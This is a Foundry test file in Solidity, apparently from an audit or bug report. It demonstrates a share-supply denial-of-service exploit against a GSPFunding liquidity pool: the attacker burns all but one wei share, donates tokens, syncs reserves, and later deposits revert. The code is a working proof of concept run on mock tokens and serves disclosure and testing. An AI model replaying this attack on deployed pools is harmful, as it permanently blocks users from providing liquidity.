pragma solidity 0.8.16;

/*
    Exploit PoC for the “totalSupply-underflow” DOS vulnerability in
    contracts/GasSavingPool/impl/GSPFunding.sol

    The attack follows exactly the steps described in the vulnerability
    write-up:

    1.  First LP mints > 1 000 shares during pool initialisation.
    2.  Attacker immediately burns everything but 1 wei share.
    3.  Attacker “donates” huge amounts of both tokens and syncs reserves.
    4.  Any subsequent call to buyShares() reverts with
       “MINT_AMOUNT_NOT_ENOUGH”, permanently bricking liquidity provision.

    The test succeeds on the vulnerable contract and would fail (i.e. the
    final expectRevert would not trigger) once the bug is fixed.
*/

import "forge-std/Test.sol";

import {GSPFunding} from "../../contracts/GasSavingPool/impl/GSPFunding.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/* -------------------------------------------------------------------------- */
/*                                 Test helpers                               */
/* -------------------------------------------------------------------------- */

contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @dev A very thin wrapper exposing a few internals we need for the PoC
 *      (setting token addresses in the constructor, manual _sync(), reading
 *      raw share balances).  No production code is modified.
 */
contract GSPFundingHarness is GSPFunding {
    constructor(address baseToken, address quoteToken) {
        _BASE_TOKEN_  = IERC20(baseToken);
        _QUOTE_TOKEN_ = IERC20(quoteToken);
    }

    function forceSync() external {
        _sync();
    }

    function shareOf(address user) external view returns (uint256) {
        return _SHARES_[user];
    }
}

/* -------------------------------------------------------------------------- */
/*                                    PoC                                     */
/* -------------------------------------------------------------------------- */

contract ExploitGSPFundingTest is Test {
    uint256 constant ONE = 1e18;

    MockERC20            base;
    MockERC20            quote;
    GSPFundingHarness    pool;

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        /* Deploy mock tokens */
        base  = new MockERC20("BASE",  "BASE");
        quote = new MockERC20("QUOTE", "QUOTE");

        /* Deploy the vulnerable pool */
        pool = new GSPFundingHarness(address(base), address(quote));

        /* Fund attacker & victim */
        base.mint(attacker, 2_000_000 * ONE);
        quote.mint(attacker, 2_000_000 * ONE);

        base.mint(victim, 10 * ONE);
        quote.mint(victim, 10 * ONE);
    }

    /**
     * Complete attack flow – after the attacker executes the sequence,
     * any honest buyShares() call is permanently DOS-ed.
     */
    function testDOSAttack() public {
        /* -------------------------------------------------------------- */
        /*                 Phase 1 – first LP initialisation              */
        /* -------------------------------------------------------------- */
        vm.startPrank(attacker);

        uint256 initialBase  = 1_001 * ONE;
        uint256 initialQuote = 1_001 * ONE;

        base.transfer(address(pool),  initialBase);
        quote.transfer(address(pool), initialQuote);

        pool.buyShares(attacker);

        uint256 minted = pool.shareOf(attacker);
        assertGt(minted, 1000);

        /* -------------------------------------------------------------- */
        /*             Phase 2 – burn everything but 1 wei share          */
        /* -------------------------------------------------------------- */
        pool.sellShares(
            minted - 1,    // shareAmount
            attacker,      // receive withdrawn tokens
            0,             // minBase
            0,             // minQuote
            bytes(""),     // callback data
            type(uint256).max
        );
        assertEq(pool.shareOf(attacker), 1);

        /* -------------------------------------------------------------- */
        /*            Phase 3 – donate huge amount and sync reserves      */
        /* -------------------------------------------------------------- */
        uint256 donation = 1_000_000 * ONE;

        base.mint(attacker,  donation);
        quote.mint(attacker, donation);

        base.transfer(address(pool),  donation);
        quote.transfer(address(pool), donation);

        pool.forceSync();  // make the contract account for the donation

        vm.stopPrank();

        /* -------------------------------------------------------------- */
        /*        Phase 4 – honest user now permanently reverts           */
        /* -------------------------------------------------------------- */
        vm.startPrank(victim);

        uint256 userBase  = 5 * ONE;
        uint256 userQuote = 5 * ONE;

        base.transfer(address(pool),  userBase);
        quote.transfer(address(pool), userQuote);

        vm.expectRevert(bytes("MINT_AMOUNT_NOT_ENOUGH"));
        pool.buyShares(victim);

        vm.stopPrank();
    }
}
